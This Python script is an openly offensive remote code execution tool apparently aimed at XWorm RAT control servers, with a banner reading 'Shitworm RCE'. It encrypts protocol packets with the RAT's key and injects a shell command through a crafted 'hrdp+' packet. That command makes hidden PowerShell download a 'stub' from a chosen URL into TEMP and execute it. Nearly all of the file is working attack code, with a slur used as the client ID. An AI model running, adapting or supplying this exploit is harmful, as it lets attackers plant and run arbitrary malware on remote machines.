import socket
import io
import time
import random
import string
import hashlib
import sys
import os
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad, unpad
from colorama import Fore
import platform

class Packet:
    def __init__(self, *data: list[bytes]):
        self.data = data

    def write_bytes(self, into):
        into.write(b'<Xwormmm>'.join(self.data))
    
    def get_bytes(self):
        b = io.BytesIO()
        self.write_bytes(b)
        return b.getbuffer().tobytes()

def genid(length=8):
    return 'sybauretard'

def sendpacket(sock, packet, key):
    key_hash = hashlib.md5(key.encode('utf-8')).digest()
    crypto = AES.new(key_hash, AES.MODE_ECB)
    data = packet.get_bytes()
    encrypted = crypto.encrypt(pad(data, 16))
    sock.send(str(len(encrypted)).encode('utf-8') + b'\0')
    sock.send(encrypted)
    return encrypted

def rce(host, port, key, file_url):
    client_id = genid()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((host, port))
    handshake_packet = Packet(b'hrdp', client_id.encode('utf-8'))
    sendpacket(sock, handshake_packet, key)
    time.sleep(0.5)
    
    file_extension = '.bat' if file_url.lower().endswith('.bat') else '.exe'
    random_filename = f"{genid(5)}{file_extension}"
    
    if file_extension == '.bat':
        ps_command = f"start powershell.exe -WindowStyle Hidden $url = \\\"{file_url}\\\"; taskkill /f /IM mstsc.exe; $outputPath = \\\"$env:TEMP\\\\{random_filename}\\\"; Invoke-WebRequest -Uri $url -OutFile $outputPath; Start-Process -FilePath 'cmd.exe' -ArgumentList '/c', $outputPath; taskkill /f /IM mstsc.exe"
    else:
        ps_command = f"start powershell.exe -WindowStyle Hidden $url = \\\"{file_url}\\\"; taskkill /f /IM mstsc.exe; $outputPath = \\\"$env:TEMP\\\\{random_filename}\\\"; Invoke-WebRequest -Uri $url -OutFile $outputPath; Start-Sleep -s 3; cmd.exe /c start \"\" $outputPath; taskkill /f /IM mstsc.exe; "
    
    exploit_packet = Packet(
        b'hrdp+', 
        client_id.encode('utf-8'), 
        b" lol", 
        f"\" & {ps_command}".encode('utf-8'),
        b"1:1"
    )
    
    sendpacket(sock, exploit_packet, key)
    sock.close()
    
    return True

def main(key, host, port):
    
    print(Fore.YELLOW + f"[?] Executing file." + Fore.RESET)
    print(Fore.YELLOW + f"[?] RCEING {host}:{port} with key {key}" + Fore.RESET)
    rce(host, port, key, file_url)
    print(Fore.GREEN + f"[+] Execution completed" + Fore.RESET)

if __name__ == "__main__":
    os.system("cls") if platform.system() == "Windows" else os.system("clear")
    print(
        Fore.RED +
        r"""
   _____ __    _ __                                   ____  ____________
  / ___// /_  (_) /__      ______  _________ ___     / __ \/ ____/ ____/
  \__ \/ __ \/ / __/ | /| / / __ \/ ___/ __ `__ \   / /_/ / /   / __/   
 ___/ / / / / / /_ | |/ |/ / /_/ / /  / / / / / /  / _, _/ /___/ /___   
/____/_/ /_/_/\__/ |__/|__/\____/_/  /_/ /_/ /_/  /_/ |_|\____/_____/   

made by discord.gg/exposing
                                                                        
"""
    )
    key = input(Fore.YELLOW + f"[?] Key: " + Fore.RESET)
    host = input(Fore.YELLOW + f"[?] Host: " + Fore.RESET)
    port = int(input(Fore.YELLOW + f"[?] Port: " + Fore.RESET))
    file_url = input(Fore.YELLOW + "[?] Whats stub url: ")
    main(key, host, port)
